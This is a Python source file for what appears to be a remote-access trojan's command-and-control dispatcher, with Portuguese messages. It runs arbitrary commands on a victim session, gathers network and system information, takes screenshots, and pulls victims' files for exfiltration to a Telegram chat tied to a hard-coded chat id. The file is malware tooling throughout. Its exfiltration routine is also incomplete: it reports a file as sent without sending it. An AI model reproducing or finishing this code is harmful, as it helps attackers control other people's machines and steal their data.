import http.client
import json
import os
class CommandDispatcher:
    def __init__(self, transport):
        self.transport = transport
        self.bot_token = os.getenv("BOT_TOKEN")
        self.chat_id = "8391867721"
    def process(self, session_id, cmd_input):
        cmd = cmd_input.lower().strip()
        if cmd == "sysinfo":
            return self.transport.transmit(session_id, "sysinfo", {})
        elif cmd == "network":
            return self.transport.transmit(session_id, "exec", {"c": "ipconfig /all"})
        elif cmd == "screenshot_telegram":
            return self.transport.transmit(session_id, "exec", {"c": "screenshot_telegram"})
        else:
            return self.transport.transmit(session_id, "exec", {"c": cmd})
    def exfiltrar_para_telegram(self, session_id, filepath):
        print(f"[*] Solicitando exfiltração: {filepath}")
        resposta_c2 = self.transport.transmit(session_id, "exfiltration", {
            "action": "get_file_bytes", 
            "path": filepath
        })
        if resposta_c2.get("status") != "success":
            return {"status": "error", "message": f"Falha: {resposta_c2.get('message')}"}
        file_data_hex = resposta_c2.get("data", "")
        if not file_data_hex:
            return {"status": "error", "message": "Arquivo vazio ou erro de leitura."}
        try:
            file_bytes = bytes.fromhex(file_data_hex)
            filename = os.path.basename(filepath)
            return {"status": "success", "data": f"[+] {filename} enviado!"}
        except Exception as e:
            return {"status": "error", "message": f"Erro: {e}"}
